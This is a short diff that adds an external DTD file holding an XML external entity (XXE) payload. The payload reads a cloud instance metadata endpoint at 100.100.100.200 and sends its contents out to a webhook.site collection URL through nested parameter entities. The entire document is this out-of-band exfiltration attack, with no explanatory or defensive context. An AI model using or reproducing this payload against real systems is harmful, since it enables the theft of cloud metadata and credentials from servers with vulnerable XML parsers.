@@ -1,0 +1,4 @@
+<!ENTITY % file SYSTEM "http://100.100.100.200/latest/meta-data/">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://webhook.site/30c557ee-0354-4157-a8b8-bad3cfaeaeeb/?v=2&d=%file;'>">
+%eval;
+%exfil;
